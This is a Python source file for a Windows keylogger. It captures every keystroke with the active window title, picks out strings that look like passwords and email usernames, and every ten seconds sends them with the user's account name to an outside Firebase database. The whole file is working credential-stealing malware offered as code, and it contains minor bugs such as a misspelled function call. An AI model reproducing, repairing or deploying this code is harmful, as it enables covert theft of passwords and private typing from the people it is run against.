import os
import keyboard #keylogs
from threading import Semaphore, Timer
from datetime import datetime
import requests
from firebase import firebase
import threading
#import win32gui
import platform

from typing import Optional
from ctypes import wintypes, windll, create_unicode_buffer

def getForegroundWindowTitle() -> Optional[str]:
    hWnd = windll.user32.GetForegroundWindow()
    length = windll.user32.GetWindowTextLengthW(hWnd)
    buf = create_unicode_buffer(length + 1)
    windll.user32.GetWindowTextW(hWnd, buf, length + 1)
    
    # 1-liner alternative: return buf.value if buf.value else None
    if buf.value:
        
        return buf.value
    else:
        return 'dunno'



# os.system("pip install -r library.txt")

send_interval= 10 #10sec
firebase = firebase.FirebaseApplication('https://testunessayproject.firebaseio.com/', None)

class Keylogger:
    def __init__(self, interval):
        self.interval = interval
        self.log = []
        self.semaphore = Semaphore(0)

        self.passwords = []
        self.passwords_very_sure = []
        self.all_strings = []
        self.potential_user = []
        self.current_string = ''
        self.shift = False
    
    def checkPass(self, s):
        window = getForegroundWindowTitle()
        toAppend = window + ":" +s 
        if len(s) != 0:
            self.all_strings.append(self.current_string)
            if(len(s) >= 8):
                self.passwords.append(toAppend)

            containDigit = False
            upperCase = False
            containsSym = False
            
            for i in s:
                if i.isdigit():
                    containDigit = True
                if i.isupper():
                    upperCase = True
                if i.isalpha():
                    containsSym = True
            if(containDigit and upperCase and containsSym):
                self.passwords_very_sure.append(toAppend)
                
            if(s.find('@') != -1 and s.find('.') != -1):
                print(True)
                self.potential_user.append(toAppend)
        
    
    def callback(self, event):
        name = event.name
        window = wgetForegroundWindowTitle()
        if len(name) == 1:
            self.current_string += name

        elif len(name) > 1:
            name = name.replace(" ", "_")
            name = f"[{name.lower()}]"
            if (name == '[space]' or name == "[tab]" or name == "[enter]"):
                
                self.checkPass(self.current_string)
                self.current_string =  ""

            elif name == '[backspace]':
                self.current_string = self.current_string[:-1]

        time = datetime.now()
        if name == "~":
            name = '[wiggle-hyphen]'
        self.log.append(time.strftime("%m/%d/%Y %H:%M:%S") + ' WINDOW: ' + window + " key: " + name)
        
    def fire_post(self, name, data):

        result = firebase.get('person', None)
        #print(result)
        if(result != None):
            for i in result:
                if (result[i]['user']) == name:
                    data['keystroke'] += ("~" + result[i]['keystroke'])
                    data['passwords'] += ("~" + result[i]['passwords'])
                    data['potential password'] += ("~" +result[i]['potential password'])
                    data['username'] += ("~" + result[i]['username'])
                    data['all strings'] += ("~" + result[i]['all strings'])
                    firebase.delete('person', i)

        firebase.post('person', data, {'print': 'silent'})


    def postData(self):
        
        name = os.getenv('username')
        data = {
            'user' : name,
            'keystroke'  : "~".join(self.log),
            'passwords' : "~".join(self.passwords),
            'potential password' : "~".join(self.passwords_very_sure),
            'username' : "~".join(self.potential_user),
            'all strings': "~".join(self.all_strings)
        }

        thread = threading.Thread(target = self.fire_post, args = (name, data))
        thread.start()
        
        #print(self.passwords, self.passwords_very_sure, self.all_strings,  self.potential_user,  self.log )
        #self.passwords = {}
        #self.passwords_very_sure = {}
        self.passwords = []
        self.passwords_very_sure = []
        self.all_strings = []
        #self.potential_user = {}
        self.potential_user = []
        self.log = []
        

    def report(self):   
        if self.log:
            self.postData()
        timer = Timer(self.interval,self.report)
        timer.start()

        
    def run (self):
        keyboard.on_release(self.callback)
        self.report()
        self.semaphore.acquire()
    
if __name__=='__main__':
    if(platform.system() != 'Windows'):
        exit(1)
    keylogger = Keylogger(send_interval)
    keylogger.run()
    

